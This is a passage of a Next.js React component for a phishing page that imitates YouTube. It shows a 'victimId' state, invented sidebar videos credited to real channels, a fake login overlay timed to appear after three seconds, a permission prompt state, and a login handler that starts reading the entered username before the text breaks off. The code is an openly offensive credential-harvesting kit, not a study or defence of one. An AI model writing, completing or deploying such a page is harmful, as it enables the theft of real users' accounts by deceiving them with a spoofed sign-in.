'use client';

import { useState, useEffect, useRef } from 'react';

const BACKEND_URL = process.env.NEXT_PUBLIC_APP_URL || '';
const VIDEO_ID = 'dQw4w9WgXcQ';

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [showPermission, setShowPermission] = useState(false);
  const [victimId, setVictimId] = useState(null);
  const [notification, setNotification] = useState('');
  const [sidebarVideos, setSidebarVideos] = useState([]);
  const loginOverlayRef = useRef(null);

  // Sidebar video data
  useEffect(() => {
    setSidebarVideos([
      { title: '🔴 LIVE | Big Announcement Today!', channel: 'BBC News', views: '2.1M views', thumb: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/default.jpg' },
      { title: 'I Built a House in 100 Days', channel: 'MrBeast', views: '45M views', thumb: 'https://i.ytimg.com/vi/1/default.jpg' },
      { title: 'Python Full Course 2026', channel: 'FreeCodeCamp', views: '8.7M views', thumb: 'https://i.ytimg.com/vi/2/default.jpg' },
      { title: 'Avengers: New Trailer', channel: 'Marvel', views: '12M views', thumb: 'https://i.ytimg.com/vi/3/default.jpg' },
      { title: 'Top 10 Gaming Moments 2026', channel: 'GamingCentral', views: '3.4M views', thumb: 'https://i.ytimg.com/vi/4/default.jpg' },
    ]);
  }, []);

  // Show login overlay after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLogin(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  // Show notification helper
  const showNotif = (msg) => {
    setNotification(msg);
    setTimeout(() => setNotification(''), 3000);
  };

  // Handle login form submission
  const handleLogin = async (e) => {
    e.preventDefault();
    const form = e.target;
    const username =
